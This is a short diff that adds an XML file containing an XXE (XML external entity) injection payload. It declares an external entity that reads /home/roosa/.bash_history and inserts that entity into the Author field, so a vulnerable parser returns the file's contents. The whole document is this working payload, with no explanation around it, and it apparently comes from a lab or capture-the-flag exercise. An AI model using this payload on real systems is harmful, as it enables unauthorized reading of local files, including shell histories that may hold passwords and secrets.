@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///home/roosa/.bash_history" >]>
+<xml>
+  <msg>hello world</msg>
+  <Author>hello author &xxe;</Author>
+  <Subject>hello subject</Subject>
+  <Content>hello content</Content>
+</xml>
